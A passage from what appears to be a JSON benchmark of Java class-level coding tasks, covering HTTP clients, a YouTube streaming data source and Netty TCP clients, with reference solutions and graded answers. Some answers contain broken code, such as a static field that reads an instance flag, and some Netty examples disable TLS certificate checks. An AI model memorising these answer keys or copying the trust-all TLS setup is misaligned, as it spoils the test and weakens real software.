conn.setReadTimeout(httpConfig.getReadTimeout());\n        if (requestMethod.equals(\"POST\")) {\n            conn.setDoOutput(true);\n        }\n        SAConfigOptions configOptions = SensorsDataAPI.getConfigOptions();\n        if (configOptions != null && configOptions.getSSLSocketFactory() != null\n                && conn instanceof HttpsURLConnection) {\n            ((HttpsURLConnection) conn).setSSLSocketFactory(configOptions.getSSLSocketFactory());\n        }\n        return conn;\n    }\n\n    private void setHeader(HttpURLConnection conn, Map<String, String> headerMap) {\n        if (headerMap != null) {\n            for (String key : headerMap.keySet()) {\n                conn.setRequestProperty(key, headerMap.get(key));\n            }\n        }\n    }\n\n    private RealResponse getRealResponse(HttpURLConnection conn) {\n        RealResponse response = new RealResponse();\n        try {\n            response.code = conn.getResponseCode();\n            if (HttpUtils.needRedirects(response.code)) {\n                response.location = HttpUtils.getLocation(conn, sRequestURL);\n            }\n            response.contentLength = conn.getContentLength();\n            if (response.code < HttpURLConnection.HTTP_BAD_REQUEST) {\n                response.result = HttpUtils.getRetString(conn.getInputStream());\n            } else {\n                response.errorMsg = HttpUtils.getRetString(conn.getErrorStream());\n            }\n        } catch (IOException e) {\n            return getExceptionResponse(e);\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n        SALog.i(TAG, response.toString());\n        return response;\n    }\n\n    private RealResponse getExceptionResponse(Exception e) {\n        RealResponse response = new RealResponse();\n        response.exception = e;\n        response.errorMsg = e.getMessage();\n        SALog.i(TAG, response.toString());\n        return response;\n    }\n\n    public RealRequest setHttpConfig(HttpConfig httpConfig) {\n        if(httpConfig == null) {\n            return this;\n        }\n        this.httpConfig = httpConfig;\n        return this;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic class RealRequest {\n    public static String sRequestURL = \"\";\n    private HttpConfig httpConfig;\n    private static final String TAG = \"SA.HttpRequest\";\n\n    public RealResponse getData(String requestURL, Map<String, String> headerMap) {\n        return performRequest(requestURL, \"GET\", null, headerMap);\n    }\n\n    public RealResponse postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) {\n        return performRequest(requestURL, \"POST\", body, headerMap);\n    }\n\n    private RealResponse performRequest(String requestURL, String requestMethod, String body, Map<String, String> headerMap) {\n        try {\n            sRequestURL = requestURL;\n            HttpURLConnection conn = getHttpURLConnection(requestURL, requestMethod);\n            if (headerMap != null) {\n                setHeader(conn, headerMap);\n            }\n            if (\"POST\".equalsIgnoreCase(requestMethod)) {\n                conn.setDoOutput(true);\n                DataOutputStream wr = new DataOutputStream(conn.getOutputStream());\n                wr.writeBytes(body);\n                wr.flush();\n                wr.close();\n            }\n            return getRealResponse(conn);\n        } catch (IOException e) {\n            return getExceptionResponse(e);\n        }\n    }\n\n    private HttpURLConnection getHttpURLConnection(String requestURL, String requestMethod) throws IOException {\n        URL url = new URL(requestURL);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(requestMethod);\n        conn.setConnectTimeout(httpConfig.getConnectTimeout());\n        conn.setReadTimeout(httpConfig.getReadTimeout());\n        return conn;\n    }\n\n    private void setHeader(HttpURLConnection conn, Map<String, String> headerMap) {\n        for (Map.Entry<String, String> entry : headerMap.entrySet()) {\n            conn.setRequestProperty(entry.getKey(), entry.getValue());\n        }\n    }\n\n    private RealResponse getRealResponse(HttpURLConnection conn) throws IOException {\n        int responseCode = conn.getResponseCode();\n        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        String inputLine;\n        StringBuilder response = new StringBuilder();\n\n        while ((inputLine = in.readLine()) != null) {\n            response.append(inputLine);\n        }\n        in.close();\n        conn.disconnect();\n        return new RealResponse(response.toString(), responseCode);\n    }\n\n    private RealResponse getExceptionResponse(Exception e) {\n        return new RealResponse(\"Error: \" + e.getMessage(), 500);\n    }\n\n    public RealRequest setHttpConfig(HttpConfig httpConfig) {\n        this.httpConfig = httpConfig;\n        return this;\n    }\n}\n\nclass HttpConfig {\n    private int connectTimeout;\n    private int readTimeout;\n\n    public HttpConfig(int connectTimeout, int readTimeout) {\n        this.connectTimeout = connectTimeout;\n        this.readTimeout = readTimeout;\n    }\n\n    public int getConnectTimeout() {\n        return connectTimeout;\n    }\n\n    public int getReadTimeout() {\n        return readTimeout;\n    }\n}\n\nclass RealResponse {\n    private String data;\n    private int statusCode;\n\n    public RealResponse(String data, int statusCode) {\n        this.data = data;\n        this.statusCode = statusCode;\n    }\n\n    public String getData() {\n        return data;\n    }\n\n    public int getStatusCode() {\n        return statusCode;\n    }\n}\n```"
  },
  {
    "Task_id": 110,
    "Instruction": "Task Description: Implement a custom HTTP data source for streaming media that handles connection management, redirects, and error handling, specifically designed for YouTube video streaming.\n\nClass Description: YoutubeHttpDataSource is a custom HTTP data source implementation that extends BaseDataSource and implements HttpDataSource interface. It provides functionality for opening and closing HTTP connections, handling redirects, and managing input streams for media streaming.\n\nAttributes:\n\nallowCrossProtocolRedirects: boolean - Determines whether cross-protocol redirects (HTTP to HTTPS or vice versa) are allowed\nconnectTimeoutMillis: int - Connection timeout in milliseconds\nreadTimeoutMillis: int - Read timeout in milliseconds\nrequestProperties: RequestProperties - Contains HTTP request headers and properties\ndataSpec: DataSpec - Contains information about the data to be read\nconnection: HttpURLConnection - The active HTTP connection\ninputStream: InputStream - The input stream for reading data\nopened: boolean - Flag indicating whether the data source is currently open\n\nMethods:\n\nopen(DataSpec dataSpecParameter) -> long - Opens the data source for the specified DataSpec and returns the length of the data\nmakeConnection(DataSpec dataSpecToUse) -> HttpURLConnection - Creates and configures an HTTP connection, handling redirects\nopenConnection(URL url) -> HttpURLConnection - Opens a basic HTTP connection to the specified URL\nhandleRedirect(URL originalUrl, String location, DataSpec dataSpecToHandleRedirect) -> URL - Handles HTTP redirects and returns the new URL\nclose() -> void - Closes the data source and releases all resources\nmaybeTerminateInputStream(HttpURLConnection connection, long bytesRemaining) -> void - Helper method to terminate input streams on specific Android versions\ncloseConnectionQuietly() -> void - Safely closes the current connection without throwing exceptions",
    "Canonical_solution": "import com.google.android.exoplayer2.C;\nimport com.google.android.exoplayer2.PlaybackException;\nimport com.google.android.exoplayer2.upstream.DataSource;\nimport com.google.android.exoplayer2.upstream.DataSpec;\nimport com.google.android.exoplayer2.upstream.HttpDataSource;\nimport com.google.android.exoplayer2.util.Util;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.lang.reflect.Method;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.NoRouteToHostException;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class YoutubeHttpDataSource extends BaseDataSource implements HttpDataSource {\n\n    private static final int MAX_REDIRECTS = 20;\n    private static final int HTTP_STATUS_TEMPORARY_REDIRECT = 307;\n    private static final int HTTP_STATUS_PERMANENT_REDIRECT = 308;\n    private static final long MAX_BYTES_TO_DRAIN = 2048;\n\n    private final boolean allowCrossProtocolRedirects;\n    private final int connectTimeoutMillis;\n    private final int readTimeoutMillis;\n    private final RequestProperties requestProperties;\n\n    @Nullable\n    private DataSpec dataSpec;\n    @Nullable\n    private HttpURLConnection connection;\n    @Nullable\n    private InputStream inputStream;\n    private boolean opened;\n\n    @Override\n    public long open(@NonNull final DataSpec dataSpecParameter) throws HttpDataSourceException {\n        this.dataSpec = dataSpecParameter;\n        transferInitializing(dataSpecParameter);\n\n        try {\n            this.connection = makeConnection(dataSpec);\n            final HttpURLConnection httpURLConnection = this.connection;\n            final int responseCode = httpURLConnection.getResponseCode();\n            final String responseMessage = httpURLConnection.getResponseMessage();\n\n            if (responseCode < 200 || responseCode > 299) {\n                throw new InvalidResponseCodeException(responseCode, responseMessage, null,\n                        httpURLConnection.getHeaderFields(), dataSpec, Util.EMPTY_BYTE_ARRAY);\n            }\n\n            inputStream = httpURLConnection.getInputStream();\n            opened = true;\n            transferStarted(dataSpecParameter);\n            return dataSpecParameter.length != C.LENGTH_UNSET ? dataSpecParameter.length : 0;\n        } catch (final IOException e) {\n            closeConnectionQuietly();\n            throw HttpDataSourceException.createForIOException(e, dataSpec,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n    }\n\n    @NonNull\n    private HttpURLConnection makeConnection(@NonNull final DataSpec dataSpecToUse)\n            throws IOException {\n        URL url = new URL(dataSpecToUse.uri.toString());\n        int redirectCount = 0;\n\n        while (redirectCount++ <= MAX_REDIRECTS) {\n            final HttpURLConnection httpURLConnection = openConnection(url);\n            httpURLConnection.setConnectTimeout(connectTimeoutMillis);\n            httpURLConnection.setReadTimeout(readTimeoutMillis);\n\n            for (final Map.Entry<String, String> property : requestProperties.getSnapshot().entrySet()) {\n                httpURLConnection.setRequestProperty(property.getKey(), property.getValue());\n            }\n\n            httpURLConnection.setInstanceFollowRedirects(false);\n            httpURLConnection.setDoOutput(true);\n            httpURLConnection.connect();\n\n            final int responseCode = httpURLConnection.getResponseCode();\n            final String location = httpURLConnection.getHeaderField(\"Location\");\n            if (responseCode == HttpURLConnection.HTTP_MOVED_PERM\n                    || responseCode == HttpURLConnection.HTTP_MOVED_TEMP\n                    || responseCode == HttpURLConnection.HTTP_SEE_OTHER\n                    || responseCode == HTTP_STATUS_TEMPORARY_REDIRECT\n                    || responseCode == HTTP_STATUS_PERMANENT_REDIRECT) {\n                httpURLConnection.disconnect();\n                url = handleRedirect(url, location, dataSpecToUse);\n            } else {\n                return httpURLConnection;\n            }\n        }\n\n        throw new HttpDataSourceException(\n                new NoRouteToHostException(\"Too many redirects: \" + redirectCount),\n                dataSpecToUse,\n                PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                HttpDataSourceException.TYPE_OPEN);\n    }\n\n    private HttpURLConnection openConnection(@NonNull final URL url) throws IOException {\n        return (HttpURLConnection) url.openConnection();\n    }\n\n    @NonNull\n    private URL handleRedirect(final URL originalUrl,\n                             @Nullable final String location,\n                             final DataSpec dataSpecToHandleRedirect)\n            throws HttpDataSourceException {\n        if (location == null) {\n            throw new HttpDataSourceException(\"Null location redirect\", dataSpecToHandleRedirect,\n                    PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n\n        try {\n            URL url = new URL(originalUrl, location);\n            String protocol = url.getProtocol();\n            if (!\"https\".equals(protocol) && !\"http\".equals(protocol)) {\n                throw new HttpDataSourceException(\"Unsupported protocol redirect: \" + protocol,\n                        dataSpecToHandleRedirect,\n                        PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                        HttpDataSourceException.TYPE_OPEN);\n            }\n            if (!allowCrossProtocolRedirects && !protocol.equals(originalUrl.getProtocol())) {\n                throw new HttpDataSourceException(\n                        \"Disallowed cross-protocol redirect (\"\n                                + originalUrl.getProtocol()\n                                + \" to \"\n                                + protocol\n                                + \")\",\n                        dataSpecToHandleRedirect,\n                        PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                        HttpDataSourceException.TYPE_OPEN);\n            }\n            return url;\n        } catch (final MalformedURLException e) {\n            throw new HttpDataSourceException(e, dataSpecToHandleRedirect,\n                    PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n    }\n\n    @Override\n    public void close() throws HttpDataSourceException {\n        try {\n            if (inputStream != null) {\n                maybeTerminateInputStream(connection, C.LENGTH_UNSET);\n                try {\n                    inputStream.close();\n                } catch (final IOException e) {\n                    throw new HttpDataSourceException(e, castNonNull(dataSpec),\n                            PlaybackException.ERROR_CODE_IO_UNSPECIFIED,\n                            HttpDataSourceException.TYPE_CLOSE);\n                }\n            }\n        } finally {\n            inputStream = null;\n            closeConnectionQuietly();\n            if (opened) {\n                opened = false;\n                transferEnded();\n            }\n        }\n    }\n\n    private static void maybeTerminateInputStream(@Nullable final HttpURLConnection connection,\n                                                final long bytesRemaining) {\n        if (connection == null || Util.SDK_INT < 19 || Util.SDK_INT > 20) {\n            return;\n        }\n\n        try {\n            InputStream inputStream = connection.getInputStream();\n            String className = inputStream.getClass().getName();\n            if (\"com.android.okhttp.internal.http.HttpTransport$ChunkedInputStream\".equals(className)\n                    || \"com.android.okhttp.internal.http.HttpTransport$FixedLengthInputStream\".equals(className)) {\n                Class<?> superclass = inputStream.getClass().getSuperclass();\n                Method unexpectedEndOfInput = checkNotNull(superclass).getDeclaredMethod(\"unexpectedEndOfInput\");\n                unexpectedEndOfInput.setAccessible(true);\n                unexpectedEndOfInput.invoke(inputStream);\n            }\n        } catch (final Exception e) {\n            // Ignore\n        }\n    }\n\n    private void closeConnectionQuietly() {\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (final Exception e) {\n                // Ignore\n            }\n            connection = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class YoutubeHttpDataSource extends BaseDataSource implements HttpDataSource {\n\n    private final boolean allowCrossProtocolRedirects;\n    private final int connectTimeoutMillis;\n    private final int readTimeoutMillis;\n    private final RequestProperties requestProperties;\n    private final DataSpec dataSpec;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n    private boolean opened;\n\n    public YoutubeHttpDataSource(boolean allowCrossProtocolRedirects, int connectTimeoutMillis, int readTimeoutMillis, RequestProperties requestProperties, DataSpec dataSpec) {\n        this.allowCrossProtocolRedirects = allowCrossProtocolRedirects;\n        this.connectTimeoutMillis = connectTimeoutMillis;\n        this.readTimeoutMillis = readTimeoutMillis;\n        this.requestProperties = requestProperties;\n        this.dataSpec = dataSpec;\n        this.opened = false;\n    }\n\n    @Override\n    public long open(DataSpec dataSpecParameter) throws IOException {\n        if (opened) {\n            throw new IllegalStateException(\"Already opened\");\n        }\n        try {\n            connection = makeConnection(dataSpecParameter);\n            inputStream = connection.getInputStream();\n            opened = true;\n            return connection.getContentLengthLong();\n        } catch (IOException e) {\n            closeConnectionQuietly();\n            throw e;\n        }\n    }\n\n    private HttpURLConnection makeConnection(DataSpec dataSpecToUse) throws IOException {\n        URL url = new URL(dataSpecToUse.uri.toString());\n        HttpURLConnection connection = openConnection(url);\n        connection.setConnectTimeout(connectTimeoutMillis);\n        connection.setReadTimeout(readTimeoutMillis);\n        connection.setRequestMethod(\"GET\");\n        for (String name : requestProperties.keySet()) {\n            connection.setRequestProperty(name, requestProperties.get(name));\n        }\n        int responseCode = connection.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_MOVED_PERM || responseCode == HttpURLConnection.HTTP_MOVED_TEMP) {\n            String location = connection.getHeaderField(\"Location\");\n            if (!allowCrossProtocolRedirects && !url.getProtocol().equals(location.split(\":\")[0])) {\n                throw new IOException(\"Cross-protocol redirect detected\");\n            }\n            URL redirectedUrl = handleRedirect(url, location, dataSpecToUse);\n            return makeConnection(new DataSpec.Builder()\n                    .setUri(redirectedUrl)\n                    .build());\n        } else if (responseCode != HttpURLConnection.HTTP_OK) {\n            throw new IOException(\"Unexpected HTTP response code: \" + responseCode);\n        }\n        return connection;\n    }\n\n    private HttpURLConnection openConnection(URL url) throws IOException {\n        return (HttpURLConnection) url.openConnection();\n    }\n\n    private URL handleRedirect(URL originalUrl, String location, DataSpec dataSpecToHandleRedirect) throws IOException {\n        return new URL(location);\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (!opened) {\n            throw new IllegalStateException(\"Not opened\");\n        }\n        try {\n            maybeTerminateInputStream(connection, 0);\n        } finally {\n            closeConnectionQuietly();\n            opened = false;\n        }\n    }\n\n    private void maybeTerminateInputStream(HttpURLConnection connection, long bytesRemaining) {\n        // Implementation for terminating input streams on specific Android versions\n    }\n\n    private void closeConnectionQuietly() {\n        try {\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            if (connection != null) {\n                connection.disconnect();\n            }\n        } catch (IOException e) {\n            // Ignore exception\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 111,
    "Instruction": "Task Description: Create a Java class that implements a RESTful client using HttpURLConnection to perform HTTP requests (GET, POST, PUT) and handle responses.\n\nClass Description: The `RestfulClient` class provides methods to execute HTTP requests (GET, POST, PUT) to a specified URL and process the responses. It handles connection setup, request parameter configuration, input/output stream management, and connection cleanup.\n\nAttributes: None\n\nMethods:\n\nMethod1: `get(String path) -> String` - Executes a GET request to the specified URL path and returns the response as a String.  \nMethod2: `post(String path, String requestBody) -> String` - Executes a POST request to the specified URL path with the provided request body and returns the response as a String.  \nMethod3: `put(String path, String requestBody) -> String` - Executes a PUT request to the specified URL path with the provided request body and returns the response as a String.  \nMethod4: `executeRequest(String method, String path, String requestBody) -> String` - Internal helper method that handles the common logic for executing HTTP requests (connection setup, request configuration, and response processing).  \nMethod5: `getVal(RestfulRequest request) -> String` - Executes a custom HTTP request based on the provided `RestfulRequest` object (containing URL, method, and parameters) and returns the response as a String.  \n\nInput:  \n- For `get`, `post`, and `put`:  \n  - `path` (String): The target URL for the HTTP request.  \n  - `requestBody` (String, optional for POST/PUT): The request payload in JSON format.  \n- For `getVal`:  \n  - `request` (RestfulRequest): An object encapsulating the request details (URL, HTTP method, and parameters).  \n\nOutput:  \n- String: The response body from the HTTP request, or `null` if an error occurs.",
    "Canonical_solution": "import lombok.extern.slf4j.Slf4j;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\n@Slf4j\npublic class RestfulClient {\n\n    public String get(String path) {\n        return executeRequest(\"GET\", path, null);\n    }\n\n    public String post(String path, String requestBody) {\n        return executeRequest(\"POST\", path, requestBody);\n    }\n\n    public String put(String path, String requestBody) {\n        return executeRequest(\"PUT\", path, requestBody);\n    }\n\n    private String executeRequest(String method, String path, String requestBody){\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(path);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            connection.setRequestProperty(\"Content-Type\", \"application/json; charset=utf-8\");\n\n            if (requestBody != null) {\n                connection.setDoOutput(true);\n                try (OutputStream os = connection.getOutputStream()) {\n                    byte[] input = requestBody.getBytes();\n                    os.write(input, 0, input.length);\n                }\n            }\n\n            if (connection.getResponseCode() == 200) {\n                try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n                    String inputLine;\n                    StringBuilder response = new StringBuilder();\n                    while ((inputLine = in.readLine()) != null) {\n                        response.append(inputLine);\n                    }\n                    return response.toString();\n                }\n            }\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n        return null;\n    }\n\n    public String getVal(RestfulRequest request) {\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(request.getUrl());\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(request.getMethod());\n            connection.setDoInput(true);\n            connection.setDoOutput(true);\n            connection.setRequestProperty(\"Content-Type\", \" application/json\");\n            byte[] content = request.getParam().getBytes();\n            connection.setRequestProperty(\"Content-Length\", content.length + \"\");\n\n            connection.setReadTimeout(10000);\n            connection.setConnectTimeout(10000);\n            connection.connect();\n            OutputStream out = connection.getOutputStream();\n            out.write(content);\n            out.flush();\n            out.close();\n\n            if (connection.getResponseCode() == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n                return response.toString();\n            }\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class RestfulClient {\n\n    public String get(String path) {\n        return executeRequest(\"GET\", path, null);\n    }\n\n    public String post(String path, String requestBody) {\n        return executeRequest(\"POST\", path, requestBody);\n    }\n\n    public String put(String path, String requestBody) {\n        return executeRequest(\"PUT\", path, requestBody);\n    }\n\n    private String executeRequest(String method, String path, String requestBody) {\n        try {\n            URL url = new URL(path);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(method);\n            conn.setDoOutput(requestBody != null);\n\n            if (requestBody != null) {\n                conn.setRequestProperty(\"Content-Type\", \"application/json\");\n                DataOutputStream wr = new DataOutputStream(conn.getOutputStream());\n                wr.writeBytes(requestBody);\n                wr.flush();\n                wr.close();\n            }\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n                conn.disconnect();\n                return response.toString();\n            } else {\n                System.out.println(\"GET request not worked\");\n                return null;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public String getVal(RestfulRequest request) {\n        return executeRequest(request.getMethod(), request.getPath(), request.getRequestBody());\n    }\n}\n\nclass RestfulRequest {\n    private String method;\n    private String path;\n    private String requestBody;\n\n    public RestfulRequest(String method, String path, String requestBody) {\n        this.method = method;\n        this.path = path;\n        this.requestBody = requestBody;\n    }\n\n    public String getMethod() {\n        return method;\n    }\n\n    public String getPath() {\n        return path;\n    }\n\n    public String getRequestBody() {\n        return requestBody;\n    }\n}\n```"
  },
  {
    "Task_id": 113,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send messages, and handle server responses.\n\nClass Description: The TelnetClient class provides functionality to connect to a remote server using TCP, with optional SSL support. It reads input from the console, sends it to the server, and handles the connection lifecycle.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be used\n- HOST: String - The host address of the remote server (default: \"127.0.0.1\")\n- PORT: int - The port number of the remote server (default: 8023 or 8992 for SSL)\n\nMethods:\n- start(): void - Initializes and starts the TCP client. Handles the connection setup, message sending, and connection teardown. Throws Exception if any error occurs during execution.\n  Input: None\n  Output: None (void)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class TelnetClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContext.newClientContext(InsecureTrustManagerFactory.INSTANCE);\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new TelnetClientInitializer(sslCtx));\n\n            Channel ch = b.connect(HOST, PORT).sync().channel();\n\n            ChannelFuture lastWriteFuture = null;\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n\n                lastWriteFuture = ch.writeAndFlush(line + \"\\r\\n\");\n\n                if (\"bye\".equals(line.toLowerCase())) {\n                    ch.closeFuture().sync();\n                    break;\n                }\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic class TelnetClient {\n    private final boolean SSL;\n    private static final String HOST = \"127.0.0.1\";\n    private static final int PORT = SSL ? 8992 : 8023;\n\n    public TelnetClient(boolean ssl) {\n        this.SSL = ssl;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (SSL) {\n                         SslContext sslCtx = SslContextBuilder.forClient()\n                             .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new TelnetClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        boolean ssl = false; // Set to true if SSL is required\n        new TelnetClient(ssl).start();\n    }\n}\n\nclass TelnetClientHandler extends SimpleChannelInboundHandler<String> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        System.out.println(\"Received: \" + msg);\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 114,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send and receive messages, and handle SSL encryption if required.\n\nClass Description: The EchoClient class is a Netty-based TCP client that connects to a specified server, optionally using SSL encryption, and includes a handler for processing incoming and outgoing messages.\n\nAttributes:\nSSL: [boolean] - Flag indicating whether SSL encryption should be used\nHOST: [String] - The host address of the server to connect to\nPORT: [int] - The port number of the server to connect to\nSIZE: [int] - The size parameter for message handling (unused in basic implementation)\n\nMethods:\nstart: [start]() -> [void] - Initializes and starts the Netty client, establishing a connection to the specified server. Handles SSL context creation if needed, configures the client pipeline, and manages connection lifecycle.\ninitChannel: [initChannel]([SocketChannel ch]) -> [void] - (Internal method) Configures the channel pipeline with SSL handler (if enabled) and custom client handler during channel initialization.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class EchoClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n    static final int SIZE = Integer.parseInt(System.getProperty(\"size\", \"256\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.TCP_NODELAY, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                     }\n                     p.addLast(new EchoClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
